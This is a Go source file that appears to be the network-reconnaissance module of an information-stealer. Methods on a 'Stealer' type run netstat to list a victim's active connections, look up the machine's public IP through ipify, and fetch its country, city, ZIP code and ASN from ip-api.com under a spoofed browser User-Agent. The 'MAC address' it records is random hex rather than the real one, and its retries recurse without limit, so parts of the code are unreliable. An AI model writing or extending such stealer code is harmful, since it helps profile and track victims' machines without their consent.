package main

import (
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os/exec"
	"regexp"
	"strconv"
	"strings"
	"time"
)

type GeoData struct {
	Country    string
	RegionName string
	City       string
	ZipCode    string
	ASNumber   string
}

type Connection struct {
	Proto   string
	Local   string
	Foreign string
	State   string
	PID     int
}

type Network struct {
	IP                 string
	MAC                string
	Geo                GeoData
	NetworkConnections []Connection
}

func (stealer *Stealer) GetNetworkConnections() {
	defer TimeTrack(time.Now())

	// Executing the netstat command to get list of active network connections on machine
	out, err := exec.Command("netstat", "-ano").Output()
	if err != nil {
		return
	}

	// Parsing out the list of active network connections from the netstat output
	for _, line := range strings.Split(string(out[:]), "\n") {
		// Skipping empty lines and lines containing only whitespace
		if line == "" || strings.TrimSpace(line) == "" {
			continue
		}
		fields := strings.Fields(line)
		if len(fields) < 5 {
			continue
		}
		connection := Connection{
			Proto:   fields[0],
			Local:   fields[1],
			Foreign: fields[2],
			State:   fields[3],
		}
		pid, err := strconv.Atoi(fields[4])
		if err == nil {
			connection.PID = pid
		}
		stealer.Network.NetworkConnections = append(stealer.Network.NetworkConnections, connection)
	}
}

func GetIPAddress() string {
	// Get the systems IPV4 IP Address
	ipResp, err := http.Get(ipAPI)
	if err != nil {
		if ipResp != nil {
			ipResp.Body.Close()
		}

		return GetIPAddress()
	}
	defer ipResp.Body.Close()

	ipBytes, _ := io.ReadAll(ipResp.Body)
	ipStr := strings.TrimSpace(string(ipBytes))

	return ipStr
}

func GetGeolocation(ip string) (string, string, string, string, string) {
	// Use the geoip API to get IP geolocation
	url := fmt.Sprintf("%s/json/%s", geoipAPI, ip)

	req, _ := http.NewRequest("GET", url, nil)
	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return GetGeolocation(ip) // Keep trying to send request
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)

	var data map[string]interface{}
	json.Unmarshal([]byte(body), &data)

	country := data["country"].(string)
	regionName := data["regionName"].(string)
	city := data["city"].(string)
	zip := data["zip"].(string)
	as := data["as"].(string)

	return country, regionName, city, zip, as
}

func (stealer *Stealer) GetNetworkAddresses() {
	defer TimeTrack(time.Now())

	// Get the systems IPV4 and MAC Address and related IP geolocation information
	ipAddress := GetIPAddress()

	src := rand.NewSource(time.Now().UnixNano())
	macAddress := regexp.MustCompile(`..`).ReplaceAllStringFunc(fmt.Sprintf("%012x", src.Int63()), func(s string) string {
		return s + ":"
	})[:17]

	country, regionName, city, zip, as := GetGeolocation(ipAddress)

	stealer.Network.Geo = GeoData{
		Country:    country,
		RegionName: regionName,
		City:       city,
		ZipCode:    zip,
		ASNumber:   as,
	}

	stealer.Network.IP = ipAddress
	stealer.Network.MAC = macAddress
}

var (
	ipAPI    = "https://api.ipify.org"
	geoipAPI = "http://ip-api.com"
)
